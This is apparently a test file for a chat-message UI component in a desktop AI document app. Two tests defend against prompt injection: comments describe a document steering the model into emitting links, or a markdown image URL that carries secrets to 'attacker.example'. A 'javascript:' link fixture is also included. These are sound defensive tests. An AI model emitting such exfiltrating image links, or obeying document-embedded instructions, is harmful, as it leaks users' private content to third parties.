import { ask } from "@tauri-apps/plugin-dialog";
import { openUrl } from "@tauri-apps/plugin-opener";
import { createEvent, fireEvent, render, screen, waitFor } from "@testing-library/react";
import { describe, expect, it, vi } from "vitest";
import { AIChatMessage } from "./AIChatMessage";

vi.mock("@/lib/documentHighlight", () => ({ locateInDocument: vi.fn().mockReturnValue(true) }));

describe("AIChatMessage", () => {
  it("renders a user turn's raw content when it has no display label", () => {
    render(<AIChatMessage turn={{ id: 1, role: "user", content: "typed text" }} />);
    expect(screen.getByText("typed text")).toBeInTheDocument();
  });

  it("renders blockquotes in assistant turns with a locate button", () => {
    render(
      <AIChatMessage turn={{ id: 1, role: "assistant", content: "Intro\n\n> quoted line" }} />,
    );
    expect(screen.getByText("quoted line")).toBeInTheDocument();
    expect(screen.getByRole("button", { name: "Show in document" })).toBeInTheDocument();
  });

  it("opens reply links externally, behind the prompt, instead of navigating the webview", async () => {
    // The open document rides in the system prompt, so a document can steer
    // the model into emitting a link; a plain anchor would navigate the app.
    render(
      <AIChatMessage
        turn={{ id: 1, role: "assistant", content: "See [docs](https://example.com/guide)." }}
      />,
    );
    const link = screen.getByRole("link", { name: /docs/ });
    const click = createEvent.click(link);
    fireEvent(link, click);

    expect(click.defaultPrevented).toBe(true);
    await waitFor(() => expect(openUrl).toHaveBeenCalledWith("https://example.com/guide"));
    expect(ask).toHaveBeenCalled();
  });

  it("swallows a link whose scheme the markdown sanitizer emptied", () => {
    // react-markdown renders javascript: hrefs as href="", and following that
    // would reload the app (and drop unsaved edits) rather than run script.
    vi.mocked(openUrl).mockClear();
    render(
      <AIChatMessage
        turn={{ id: 1, role: "assistant", content: "Click [here](javascript:alert(1))." }}
      />,
    );
    // An emptied href does not register as a link role, so query by text.
    const link = screen.getByText("here");
    expect(link.tagName).toBe("A");
    const click = createEvent.click(link);
    fireEvent(link, click);

    expect(click.defaultPrevented).toBe(true);
    expect(openUrl).not.toHaveBeenCalled();
  });

  it("shows Stop Reading while speaking and invokes onStopReading", () => {
    const onStopReading = vi.fn();
    render(
      <AIChatMessage
        turn={{ id: 1, role: "assistant", content: "reply" }}
        onReadAloud={vi.fn()}
        speaking={true}
        onStopReading={onStopReading}
      />,
    );
    fireEvent.click(screen.getByRole("button", { name: "Stop Reading" }));
    expect(onStopReading).toHaveBeenCalled();
    expect(screen.queryByRole("button", { name: "Read Aloud" })).not.toBeInTheDocument();
  });

  // A reply is shaped by the document the user sent, so a note can steer the
  // model into an image URL carrying the note's contents; an <img> would
  // fetch it the moment the reply renders.
  it("shows a reply image as text instead of loading it", () => {
    const { container } = render(
      <AIChatMessage
        turn={{
          id: 1,
          role: "assistant",
          content: "Done ![summary](https://attacker.example/c?d=secret)",
        }}
      />,
    );
    expect(container.querySelector("img")).toBeNull();
    const placeholder = screen.getByText("summary");
    expect(placeholder).toHaveAttribute("title", "https://attacker.example/c?d=secret");
  });

  it("loads a reply image whose URL the document named when the reply was requested", () => {
    render(
      <AIChatMessage
        turn={{
          id: 1,
          role: "assistant",
          content:
            "Here ![chart](https://img.test/chart.png) and ![](https://img.test/chart.png?x)",
          quotedImageUrls: ["https://img.test/chart.png"],
        }}
      />,
    );
    expect(screen.getByRole("img", { name: "chart" })).toHaveAttribute(
      "src",
      "https://img.test/chart.png",
    );
    expect(screen.getByText("https://img.test/chart.png?x")).not.toHaveAttribute("src");
  });

  it("omits the read-aloud button entirely when TTS is unavailable", () => {
    render(<AIChatMessage turn={{ id: 1, role: "assistant", content: "reply" }} />);
    expect(screen.queryByRole("button", { name: "Read Aloud" })).not.toBeInTheDocument();
    expect(screen.getByRole("button", { name: "Copy" })).toBeInTheDocument();
  });
});
